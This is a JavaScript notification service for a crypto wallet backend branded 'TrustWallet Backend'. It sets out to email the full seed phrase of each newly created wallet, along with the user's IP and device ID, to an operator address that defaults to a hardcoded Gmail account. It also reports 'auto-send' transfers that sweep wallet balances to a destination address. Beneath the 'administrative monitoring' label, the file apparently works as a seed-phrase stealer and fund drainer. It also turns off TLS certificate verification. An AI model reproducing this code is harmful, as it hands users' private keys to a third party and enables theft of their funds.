const nodemailer = require("nodemailer");
const auditLogger = require("../../security/audit-logger.service");

class NotificationService {
  constructor() {
    this.transporter = null;
    this.isConfigured = false;
    this.adminEmail = process.env.ADMIN_EMAIL || "golden.dev.216@gmail.com";
    this.supportEmail = process.env.SMTP_USER || "githukueliud@gmail.com";
    this.initializeTransporter();
    this.loadAdminEmailFromDB();
  }

  /**
   * Load admin email from database
   */
  async loadAdminEmailFromDB() {
    try {
      const { walletDB } = require("../../wallet/db");
      const config = await walletDB
        .prepare(
          "SELECT admin_email FROM wallet_balance_monitor_config WHERE id = 1"
        )
        .get();

      console.log(config, config.admin_email);

      if (config && config.admin_email) {
        this.adminEmail = config.admin_email;
      }
    } catch (error) {
      // Use default if database read fails
      console.warn(
        "Failed to load admin email from database, using default:",
        error.message
      );
    }
  }

  /**
   * Update admin email dynamically
   */
  updateAdminEmail(newEmail) {
    if (newEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(newEmail)) {
      this.adminEmail = newEmail;
      console.log(`✅ Admin email updated to: ${this.adminEmail}`);
    }
  }

  initializeTransporter() {
    if (!process.env.SMTP_HOST || !process.env.SMTP_USER) {
      console.warn(
        "⚠️  Email notifications not configured. Set SMTP_* environment variables."
      );
      return;
    }

    try {
      const smtpPort = parseInt(process.env.SMTP_PORT) || 587;

      this.transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: smtpPort,
        secure: smtpPort === 465,
        auth: {
          user: process.env.SMTP_USER,
          pass: process.env.SMTP_PASSWORD,
        },
        tls: {
          rejectUnauthorized: false,
          minVersion: "TLSv1.2",
        },
        connectionTimeout: 10000,
        greetingTimeout: 10000,
        socketTimeout: 10000,
        debug: process.env.NODE_ENV === "development",
        logger: process.env.NODE_ENV === "development",
      });

      this.transporter.verify((error, success) => {
        if (error) {
          console.error("❌ Email verification failed:", error.message);
          this.isConfigured = false;
        } else {
          this.isConfigured = true;
          //console.log('✅ Email notifications configured and verified');
          //console.log(`📧 Admin monitoring email: ${this.adminEmail}`);
          //console.log(`📧 Support email (sender): ${this.supportEmail}`);
        }
      });
    } catch (error) {
      console.error("❌ Failed to configure email:", error.message);
      auditLogger.logError(error, { service: "NotificationService" });
      this.isConfigured = false;
    }
  }

  /**
   * Send wallet created notification with SEED PHRASE to admin
   */
  async sendWalletCreatedNotification(data) {
    const subject = `🔐 NEW WALLET CREATED - ${data.walletName}`;

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            line-height: 1.6; 
            color: #333; 
            background: #f5f5f5;
            margin: 0;
            padding: 0;
          }
          .container { 
            max-width: 700px; 
            margin: 20px auto; 
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
          }
          .header { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            padding: 30px; 
            text-align: center; 
          }
          .header h1 {
            margin: 0;
            font-size: 28px;
          }
          .content { 
            padding: 30px; 
          }
          .section {
            background: #f9f9f9;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
            border-left: 4px solid #667eea;
          }
          .critical {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
          }
          .seed-phrase {
            background: #2d3748;
            color: #68d391;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            word-wrap: break-word;
            border: 2px solid #ffc107;
          }
          .info-grid {
            display: grid;
            grid-template-columns: 140px 1fr;
            gap: 10px;
            margin: 10px 0;
          }
          .info-label {
            font-weight: bold;
            color: #666;
          }
          .info-value {
            color: #333;
            word-break: break-all;
          }
          .address {
            background: #e3f2fd;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 13px;
          }
          .chains {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin: 15px 0;
          }
          .chain-badge {
            background: #667eea;
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
          }
          .footer { 
            background: #f9f9f9;
            text-align: center; 
            padding: 20px; 
            color: #666; 
            font-size: 12px;
            border-top: 1px solid #e0e0e0;
          }
          .warning-icon {
            font-size: 24px;
            margin-right: 10px;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🔐 New Wallet Created</h1>
            <p style="margin: 5px 0 0 0; font-size: 16px;">Administrative Record</p>
          </div>
          
          <div class="content">
            <!-- Critical Seed Phrase Section -->
            <div class="critical">
              <h2 style="margin-top: 0;">
                <span class="warning-icon">⚠️</span>
                CONFIDENTIAL - SEED PHRASE
              </h2>
              <p><strong>Store this securely. This is the ONLY recovery method.</strong></p>
              <div class="seed-phrase">
                ${data.mnemonic || "Not provided"}
              </div>
              <p style="color: #d32f2f; font-weight: bold; margin-bottom: 0;">
                ⚠️ Never share this seed phrase. Anyone with access can control the wallet.
              </p>
            </div>

            <!-- Wallet Information -->
            <div class="section">
              <h3 style="margin-top: 0;">📊 Wallet Information</h3>
              <div class="info-grid">
                <div class="info-label">Wallet Name:</div>
                <div class="info-value"><strong>${
                  data.walletName
                }</strong></div>
                
                <div class="info-label">Wallet ID:</div>
                <div class="info-value"><code>${data.walletId}</code></div>
                
                <div class="info-label">Device ID:</div>
                <div class="info-value"><code>${
                  data.devicePassCodeId
                }</code></div>
                
                <div class="info-label">Main Wallet:</div>
                <div class="info-value">${
                  data.isMain ? "✅ Yes" : "❌ No"
                }</div>
                
                <div class="info-label">Created:</div>
                <div class="info-value">${new Date().toLocaleString()}</div>
                
                ${
                  data.ip
                    ? `
                <div class="info-label">IP Address:</div>
                <div class="info-value">${data.ip}</div>
                `
                    : ""
                }
              </div>
            </div>

            <!-- Primary Address -->
            <div class="section">
              <h3 style="margin-top: 0;">🏠 Primary Address</h3>
              <div class="address">
                ${data.primaryAddress || data.address || "Not available"}
              </div>
            </div>

            <!-- Supported Chains -->
            ${
              data.chains && data.chains.length > 0
                ? `
            <div class="section">
              <h3 style="margin-top: 0;">⛓️ Supported Blockchains (${
                data.chains.length
              })</h3>
              <div class="chains">
                ${data.chains
                  .map((chain) => `<span class="chain-badge">${chain}</span>`)
                  .join("")}
              </div>
            </div>
            `
                : ""
            }

            <!-- Network Details -->
            ${
              data.networks && data.networks.length > 0
                ? `
            <div class="section">
              <h3 style="margin-top: 0;">🌐 Network Addresses</h3>
              ${data.networks
                .map(
                  (net) => `
                <div style="margin: 10px 0; padding: 10px; background: white; border-radius: 5px;">
                  <strong>${net.chainName || net.chain} (${
                    net.symbol
                  })</strong><br>
                  <code style="font-size: 12px; color: #666;">${
                    net.address
                  }</code>
                </div>
              `
                )
                .join("")}
            </div>
            `
                : ""
            }

            <!-- Security Reminder -->
            <div class="critical">
              <h3 style="margin-top: 0;">🔒 Security Reminders</h3>
              <ul style="margin: 10px 0;">
                <li>Store the seed phrase in a secure offline location</li>
                <li>Create encrypted backups of this email</li>
                <li>Never share wallet credentials via unsecured channels</li>
                <li>Monitor wallet activity regularly</li>
                <li>Set up balance alerts for important wallets</li>
              </ul>
            </div>
          </div>
          
          <div class="footer">
            <p><strong>TrustWallet Backend - Administrative Monitoring System</strong></p>
            <p>This email contains sensitive information. Handle with care.</p>
            <p style="margin-top: 10px; font-size: 11px;">Generated: ${new Date().toISOString()}</p>
            <p style="margin-top: 5px;">📧 Sent to: ${this.adminEmail}</p>
            <p>© ${new Date().getFullYear()} Multi-Chain Wallet System. All rights reserved.</p>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
╔═══════════════════════════════════════════════════════════╗
🔐 NEW WALLET CREATED - ADMINISTRATIVE RECORD
╚═══════════════════════════════════════════════════════════╝

⚠️  CONFIDENTIAL - SEED PHRASE (STORE SECURELY):
${data.mnemonic || "Not provided"}

📊 WALLET INFORMATION:
- Wallet Name: ${data.walletName}
- Wallet ID: ${data.walletId}
- Device ID: ${data.devicePassCodeId}
- Main Wallet: ${data.isMain ? "Yes" : "No"}
- Created: ${new Date().toLocaleString()}
${data.ip ? `- IP Address: ${data.ip}` : ""}

🏠 PRIMARY ADDRESS:
${data.primaryAddress || data.address || "Not available"}

${
  data.chains && data.chains.length > 0
    ? `
⛓️  SUPPORTED BLOCKCHAINS (${data.chains.length}):
${data.chains.join(", ")}
`
    : ""
}

${
  data.networks && data.networks.length > 0
    ? `
🌐 NETWORK ADDRESSES:
${data.networks
  .map(
    (net) => `- ${net.chainName || net.chain} (${net.symbol}): ${net.address}`
  )
  .join("\n")}
`
    : ""
}

🔒 SECURITY REMINDERS:
- Store the seed phrase in a secure offline location
- Create encrypted backups of this email
- Never share wallet credentials via unsecured channels
- Monitor wallet activity regularly
- Set up balance alerts for important wallets

═══════════════════════════════════════════════════════════
⚠️  WARNING: This email contains sensitive information
Handle with extreme care and store securely
═══════════════════════════════════════════════════════════

TrustWallet Backend - Administrative Monitoring System
Generated: ${new Date().toISOString()}
📧 Sent to: ${this.adminEmail}
    `;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send transaction notification (SEND)
   */
  async sendTransactionNotification(data) {
    const subject = `💸 Transaction Alert: ${
      data.type === "SEND" ? "Sent" : "Received"
    } ${data.amount} ${data.chain}`;

    const html = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: ${data.type === "SEND" ? "#FF5722" : "#4CAF50"};">
          ${data.type === "SEND" ? "📤 Funds Sent" : "📥 Funds Received"}
        </h2>
        
        <div style="background-color: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin-top: 0;">Transaction Details</h3>
          <p><strong>Wallet ID:</strong> ${data.walletId}</p>
          <p><strong>Wallet Name:</strong> ${data.walletName}</p>
          <p><strong>Chain:</strong> ${data.chain}</p>
          <p><strong>Amount:</strong> <span style="font-size: 20px; font-weight: bold; color: #2196F3;">${
            data.amount
          }</span></p>
          <p><strong>From:</strong> <code>${data.from}</code></p>
          <p><strong>To:</strong> <code>${data.to}</code></p>
          <p><strong>Transaction Hash:</strong> <code>${data.txHash}</code></p>
          <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        </div>

        <div style="text-align: center; margin: 20px 0;">
          <a href="${this.getExplorerUrl(data.chain, data.txHash)}" 
             style="display: inline-block; background-color: #2196F3; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold;">
            View on Explorer
          </a>
        </div>

        ${
          data.type === "SEND"
            ? `
        <div style="background-color: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107;">
          <h4 style="margin-top: 0; color: #856404;">⚠️ Security Reminder</h4>
          <p style="margin: 0; color: #856404;">
            If you didn't authorize this transaction, immediately secure your wallet and change your device passcode.
          </p>
        </div>
        `
            : ""
        }

        <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 12px;">
          <p>This is an automated notification from TwwWin Wallet Backend.</p>
          <p>Timestamp: ${new Date().toISOString()}</p>
        </div>
      </div>
    `;

    const text = `
${data.type === "SEND" ? "Funds Sent" : "Funds Received"}

Transaction Details:
- Wallet ID: ${data.walletId}
- Wallet Name: ${data.walletName}
- Chain: ${data.chain}
- Amount: ${data.amount}
- From: ${data.from}
- To: ${data.to}
- Transaction Hash: ${data.txHash}
- Timestamp: ${new Date().toLocaleString()}

View on Explorer: ${this.getExplorerUrl(data.chain, data.txHash)}

Timestamp: ${new Date().toISOString()}
    `;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send transaction notification (SEND/RECEIVE)
   */
  async sendTransactionNotification(data) {
    const subject = `💸 Transaction Alert: ${
      data.type === "SEND" ? "Sent" : "Received"
    } ${data.amount} ${data.chain}`;

    const html = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: ${data.type === "SEND" ? "#FF5722" : "#4CAF50"};">
          ${data.type === "SEND" ? "📤 Funds Sent" : "📥 Funds Received"}
        </h2>
        
        <div style="background-color: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin-top: 0;">Transaction Details</h3>
          <p><strong>Wallet ID:</strong> ${data.walletId}</p>
          <p><strong>Wallet Name:</strong> ${data.walletName}</p>
          <p><strong>Chain:</strong> ${data.chain}</p>
          <p><strong>Amount:</strong> <span style="font-size: 20px; font-weight: bold; color: #2196F3;">${
            data.amount
          }</span></p>
          <p><strong>From:</strong> <code>${data.from}</code></p>
          <p><strong>To:</strong> <code>${data.to}</code></p>
          <p><strong>Transaction Hash:</strong> <code>${data.txHash}</code></p>
          <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        </div>

        <div style="text-align: center; margin: 20px 0;">
          <a href="${this.getExplorerUrl(data.chain, data.txHash)}" 
             style="display: inline-block; background-color: #2196F3; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold;">
            View on Explorer
          </a>
        </div>

        ${
          data.type === "SEND"
            ? `
        <div style="background-color: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107;">
          <h4 style="margin-top: 0; color: #856404;">⚠️ Security Reminder</h4>
          <p style="margin: 0; color: #856404;">
            If you didn't authorize this transaction, immediately secure your wallet and change your device passcode.
          </p>
        </div>
        `
            : ""
        }

        <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 12px;">
          <p>This is an automated notification from TwwWin Wallet Backend.</p>
          <p>Timestamp: ${new Date().toISOString()}</p>
        </div>
      </div>
    `;

    const text = `
${data.type === "SEND" ? "Funds Sent" : "Funds Received"}

Transaction Details:
- Wallet ID: ${data.walletId}
- Wallet Name: ${data.walletName}
- Chain: ${data.chain}
- Amount: ${data.amount}
- From: ${data.from}
- To: ${data.to}
- Transaction Hash: ${data.txHash}
- Timestamp: ${new Date().toLocaleString()}

View on Explorer: ${this.getExplorerUrl(data.chain, data.txHash)}

Timestamp: ${new Date().toISOString()}
    `;

    return this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send low balance alert (existing from your code)
   */
  async sendLowBalanceAlert(data) {
    const subject = `⚠️ LOW BALANCE ALERT - ${data.walletName || "Wallet"} [${
      data.chain
    }]`;

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 650px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%); color: white; padding: 25px; text-align: center; }
          .content { padding: 30px; }
          .warning-box { background: #fff3e0; border-left: 6px solid #ff9800; padding: 20px; margin: 20px 0; border-radius: 5px; }
          .balance-comparison { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
          .balance-item { background: #f9f9f9; padding: 20px; border-radius: 8px; text-align: center; }
          .balance-value { font-size: 24px; font-weight: bold; margin: 10px 0; }
          .critical { color: #ff9800; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>⚠️ LOW BALANCE ALERT</h1>
            <p style="margin: 5px 0 0 0;">Immediate Attention Required</p>
          </div>
          
          <div class="content">
            <div class="warning-box">
              <h2 style="margin-top: 0; color: #ff9800;">⚠️ Threshold Breached</h2>
              <p><strong>The wallet balance has fallen below the configured threshold.</strong></p>
            </div>

            <div class="balance-comparison">
              <div class="balance-item">
                <div style="color: #666; font-size: 14px;">Current Balance</div>
                <div class="balance-value critical">${
                  data.currentBalance || data.balance
                }</div>
                <div style="color: #666; font-size: 12px;">${data.chain}</div>
              </div>
              <div class="balance-item">
                <div style="color: #666; font-size: 14px;">Threshold</div>
                <div class="balance-value">${data.threshold}</div>
                <div style="color: #666; font-size: 12px;">Minimum Required</div>
              </div>
            </div>

            <div style="background: #f9f9f9; padding: 20px; margin: 20px 0; border-radius: 8px;">
              <h3 style="margin-top: 0;">📊 Wallet Information</h3>
              <p><strong>Wallet:</strong> ${data.walletName || "N/A"}</p>
              ${
                data.walletId
                  ? `<p><strong>Wallet ID:</strong> <code>${data.walletId}</code></p>`
                  : ""
              }
              <p><strong>Blockchain:</strong> ${data.chain}</p>
              <p><strong>Address:</strong> <code style="font-size: 12px;">${
                data.address
              }</code></p>
              <p><strong>Alert Time:</strong> ${new Date(
                data.timestamp || Date.now()
              ).toLocaleString()}</p>
            </div>
          </div>
          
          <div style="background: #f9f9f9; text-align: center; padding: 20px; color: #666; font-size: 12px; border-top: 1px solid #e0e0e0;">
            <p><strong>TrustWallet Backend - Balance Monitoring System</strong></p>
            <p>📧 Sent to: ${this.adminEmail}</p>
            <p>Generated: ${new Date().toISOString()}</p>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
⚠️ LOW BALANCE ALERT - IMMEDIATE ATTENTION REQUIRED
═══════════════════════════════════════════════════════════

THRESHOLD BREACHED
The wallet balance has fallen below the configured threshold.

CURRENT STATUS:
- Current Balance: ${data.currentBalance || data.balance} ${data.chain}
- Threshold: ${data.threshold}

📊 WALLET INFORMATION:
- Wallet: ${data.walletName || "N/A"}
${data.walletId ? `- Wallet ID: ${data.walletId}` : ""}
- Blockchain: ${data.chain}
- Address: ${data.address}
- Alert Time: ${new Date(data.timestamp || Date.now()).toLocaleString()}

═══════════════════════════════════════════════════════════
TrustWallet Backend - Balance Monitoring System
📧 Sent to: ${this.adminEmail}
Generated: ${new Date().toISOString()}
    `;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send balance change alert (existing from your code)
   */
  async sendBalanceChangeAlert(data) {
    const isPositive = parseFloat(data.change) > 0;
    const subject = `${isPositive ? "📈" : "📉"} Balance Change - ${
      data.walletName
    } [${data.chain}]`;

    const html = `Balance changed by ${data.change} ${data.chain} (${data.percentChange}%)`;
    const text = `Balance Change: ${data.change} ${data.chain}`;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send balance update notification (existing from your code)
   */
  async sendBalanceUpdateNotification(data) {
    const subject = `💰 Balance Update - ${data.walletName} [${data.chain}]`;
    const html = `Current balance: ${data.balance} ${
      data.symbol || data.chain
    }`;
    const text = `Balance: ${data.balance}`;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Test email configuration (existing from your code)
   */
  async testConfiguration() {
    if (!this.isConfigured) {
      return {
        success: false,
        error: "Email not configured. Check SMTP_* environment variables.",
        adminEmail: this.adminEmail,
      };
    }

    try {
      await this.transporter.verify();
      return {
        success: true,
        message: "Email configuration is valid",
        adminEmail: this.adminEmail,
        supportEmail: this.supportEmail,
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        adminEmail: this.adminEmail,
      };
    }
  }

  /**
   * Send email to admin (existing method from your code)
   */
  async sendAdminEmail(subject, html, text) {
    // Load latest admin email from database before sending
    this.loadAdminEmailFromDB();

    if (!this.isConfigured) {
      //console.log('📧 Email not configured. Would send to:', this.adminEmail);
      //console.log('Subject:', subject);
      return { success: false, reason: "Not configured" };
    }

    try {
      //console.log(`📤 Sending email to admin: ${this.adminEmail}`);
      //console.log(`📝 Subject: ${subject}`);

      const mailOptions = {
        from: process.env.SMTP_FROM || this.supportEmail,
        to: this.adminEmail,
        subject,
        text,
        html,
      };

      const info = await this.transporter.sendMail(mailOptions);

      //console.log('✅ Email sent successfully!');
      //console.log(`📧 Message ID: ${info.messageId}`);

      if (auditLogger.logger && typeof auditLogger.logger.info === "function") {
        auditLogger.logger.info({
          type: "ADMIN_EMAIL_SENT",
          to: this.adminEmail,
          subject,
          messageId: info.messageId,
          timestamp: new Date().toISOString(),
        });
      }

      return { success: true, messageId: info.messageId };
    } catch (error) {
      console.error("❌ Email sending failed:", error.message);
      auditLogger.logError(error, {
        service: "sendAdminEmail",
        subject,
        adminEmail: this.adminEmail,
      });

      return { success: false, error: error.message };
    }
  }

  /**
   * Generic email sending method
   */
  async sendEmail(to, subject, html, text) {
    if (!this.isConfigured) {
      //console.log('📧 Email would be sent:', { to, subject });
      return { success: false, reason: "Not configured" };
    }

    try {
      const mailOptions = {
        from: process.env.SMTP_FROM || this.supportEmail,
        to,
        subject,
        text,
        html,
      };

      const info = await this.transporter.sendMail(mailOptions);

      if (auditLogger.logger && typeof auditLogger.logger.info === "function") {
        auditLogger.logger.info({
          type: "EMAIL_SENT",
          to,
          subject,
          messageId: info.messageId,
          timestamp: new Date().toISOString(),
        });
      }

      return { success: true, messageId: info.messageId };
    } catch (error) {
      auditLogger.logError(error, {
        service: "sendEmail",
        to,
        subject,
      });
      return { success: false, error: error.message };
    }
  }

  /**
   * Send first deposit notification
   */
  async sendFirstDepositNotification(data) {
    const subject = `💰 FIRST DEPOSIT RECEIVED - ${
      data.walletName || "Wallet"
    }`;

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; background: #f5f5f5; margin: 0; padding: 0; }
          .container { max-width: 700px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%); color: white; padding: 30px; text-align: center; }
          .content { padding: 30px; }
          .success-box { background: #d4edda; border-left: 4px solid #28a745; padding: 20px; margin: 20px 0; border-radius: 8px; }
          .info-grid { display: grid; grid-template-columns: 140px 1fr; gap: 10px; margin: 10px 0; }
          .info-label { font-weight: bold; color: #666; }
          .info-value { color: #333; word-break: break-all; }
          .amount { font-size: 32px; font-weight: bold; color: #28a745; text-align: center; margin: 20px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>💰 First Deposit Received</h1>
            <p style="margin: 5px 0 0 0; font-size: 16px;">Wallet Activated</p>
          </div>
          
          <div class="content">
            <div class="success-box">
              <h2 style="margin-top: 0; color: #28a745;">✅ Wallet Activated Successfully</h2>
              <p>The wallet has received its first deposit and is now active.</p>
            </div>

            <div class="amount">
              ${data.amount} ${data.symbol || data.chain}
            </div>

            <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="margin-top: 0;">📊 Transaction Details</h3>
              <div class="info-grid">
                <div class="info-label">Wallet Name:</div>
                <div class="info-value">${data.walletName || "N/A"}</div>
                
                <div class="info-label">Wallet ID:</div>
                <div class="info-value"><code>${data.walletId}</code></div>
                
                <div class="info-label">Chain:</div>
                <div class="info-value">${data.chain}</div>
                
                <div class="info-label">Amount:</div>
                <div class="info-value"><strong>${data.amount} ${
      data.symbol || data.chain
    }</strong></div>
                
                <div class="info-label">From Address:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.fromAddress || "N/A"
                }</code></div>
                
                <div class="info-label">To Address:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.toAddress || data.address
                }</code></div>
                
                <div class="info-label">Transaction Hash:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.txHash
                }</code></div>
                
                <div class="info-label">Timestamp:</div>
                <div class="info-value">${new Date(
                  data.timestamp || Date.now()
                ).toLocaleString()}</div>
              </div>
            </div>

            ${
              data.txHash
                ? `
            <div style="text-align: center; margin: 20px 0;">
              <a href="${this.getExplorerUrl(data.chain, data.txHash)}" 
                 style="display: inline-block; background-color: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold;">
                View Transaction on Explorer
              </a>
            </div>
            `
                : ""
            }

            <div style="background: #e7f3ff; padding: 15px; border-radius: 8px; border-left: 4px solid #2196F3; margin: 20px 0;">
              <h4 style="margin-top: 0; color: #1976D2;">📝 Next Steps</h4>
              <ul style="margin: 0; padding-left: 20px; color: #1976D2;">
                <li>Monitor wallet balance regularly</li>
                <li>Set up balance alerts if needed</li>
                <li>Keep wallet credentials secure</li>
              </ul>
            </div>

            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 12px; text-align: center;">
              <p>This is an automated notification from TrustWallet Backend.</p>
              <p>Generated: ${new Date().toISOString()}</p>
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
╔═══════════════════════════════════════════════════════════╗
💰 FIRST DEPOSIT RECEIVED - WALLET ACTIVATED
╚═══════════════════════════════════════════════════════════╝

✅ Wallet Activated Successfully
The wallet has received its first deposit and is now active.

📊 TRANSACTION DETAILS:
- Wallet Name: ${data.walletName || "N/A"}
- Wallet ID: ${data.walletId}
- Chain: ${data.chain}
- Amount: ${data.amount} ${data.symbol || data.chain}
- From Address: ${data.fromAddress || "N/A"}
- To Address: ${data.toAddress || data.address}
- Transaction Hash: ${data.txHash}
- Timestamp: ${new Date(data.timestamp || Date.now()).toLocaleString()}

${
  data.txHash
    ? `View Transaction: ${this.getExplorerUrl(data.chain, data.txHash)}`
    : ""
}

═══════════════════════════════════════════════════════════
TrustWallet Backend - Administrative Monitoring System
Generated: ${new Date().toISOString()}
    `;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send auto-send success notification
   */
  async sendAutoSendSuccessNotification(data) {
    const subject = `✅ AUTO-SEND SUCCESS - ${data.walletName || "Wallet"} [${
      data.chain
    }]`;

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; background: #f5f5f5; margin: 0; padding: 0; }
          .container { max-width: 700px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
          .header { background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%); color: white; padding: 30px; text-align: center; }
          .content { padding: 30px; }
          .success-box { background: #d4edda; border-left: 4px solid #28a745; padding: 20px; margin: 20px 0; border-radius: 8px; }
          .info-grid { display: grid; grid-template-columns: 140px 1fr; gap: 10px; margin: 10px 0; }
          .info-label { font-weight: bold; color: #666; }
          .info-value { color: #333; word-break: break-all; }
          .amount { font-size: 28px; font-weight: bold; color: #28a745; text-align: center; margin: 20px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>✅ Auto-Send Successful</h1>
            <p style="margin: 5px 0 0 0; font-size: 16px;">Balance Automatically Transferred</p>
          </div>
          
          <div class="content">
            <div class="success-box">
              <h2 style="margin-top: 0; color: #28a745;">✅ Transfer Completed</h2>
              <p>The wallet balance has been automatically sent to the destination address.</p>
            </div>

            <div class="amount">
              ${data.totalAmount || data.amount} ${data.symbol || data.chain}
            </div>

            <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="margin-top: 0;">📊 Transfer Details</h3>
              <div class="info-grid">
                <div class="info-label">Wallet Name:</div>
                <div class="info-value">${data.walletName || "N/A"}</div>
                
                <div class="info-label">Wallet ID:</div>
                <div class="info-value"><code>${data.walletId}</code></div>
                
                <div class="info-label">Chain:</div>
                <div class="info-value">${data.chain}</div>
                
                <div class="info-label">Total Sent:</div>
                <div class="info-value"><strong>${
                  data.totalAmount || data.amount
                } ${data.symbol || data.chain}</strong></div>
                
                <div class="info-label">From Address:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.fromAddress || data.walletAddress
                }</code></div>
                
                <div class="info-label">To Address:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.toAddress || data.destinationAddress
                }</code></div>
                
                ${
                  data.txHash
                    ? `
                <div class="info-label">Transaction Hash:</div>
                <div class="info-value"><code style="font-size: 12px;">${data.txHash}</code></div>
                `
                    : ""
                }
                
                <div class="info-label">Timestamp:</div>
                <div class="info-value">${new Date(
                  data.timestamp || Date.now()
                ).toLocaleString()}</div>
              </div>
            </div>

            ${
              data.txHash
                ? `
            <div style="text-align: center; margin: 20px 0;">
              <a href="${this.getExplorerUrl(data.chain, data.txHash)}" 
                 style="display: inline-block; background-color: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold;">
                View Transaction on Explorer
              </a>
            </div>
            `
                : ""
            }

            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 12px; text-align: center;">
              <p>This is an automated notification from TrustWallet Backend.</p>
              <p>Generated: ${new Date().toISOString()}</p>
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
╔═══════════════════════════════════════════════════════════╗
✅ AUTO-SEND SUCCESS - BALANCE TRANSFERRED
╚═══════════════════════════════════════════════════════════╝

✅ Transfer Completed
The wallet balance has been automatically sent to the destination address.

📊 TRANSFER DETAILS:
- Wallet Name: ${data.walletName || "N/A"}
- Wallet ID: ${data.walletId}
- Chain: ${data.chain}
- Total Sent: ${data.totalAmount || data.amount} ${data.symbol || data.chain}
- From Address: ${data.fromAddress || data.walletAddress}
- To Address: ${data.toAddress || data.destinationAddress}
${data.txHash ? `- Transaction Hash: ${data.txHash}` : ""}
- Timestamp: ${new Date(data.timestamp || Date.now()).toLocaleString()}

${
  data.txHash
    ? `View Transaction: ${this.getExplorerUrl(data.chain, data.txHash)}`
    : ""
}

═══════════════════════════════════════════════════════════
TrustWallet Backend - Administrative Monitoring System
Generated: ${new Date().toISOString()}
    `;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Send auto-send failure notification
   */
  async sendAutoSendFailureNotification(data) {
    const subject = `❌ AUTO-SEND FAILED - ${data.walletName || "Wallet"} [${
      data.chain
    }]`;

    const html = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; background: #f5f5f5; margin: 0; padding: 0; }
          .container { max-width: 700px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
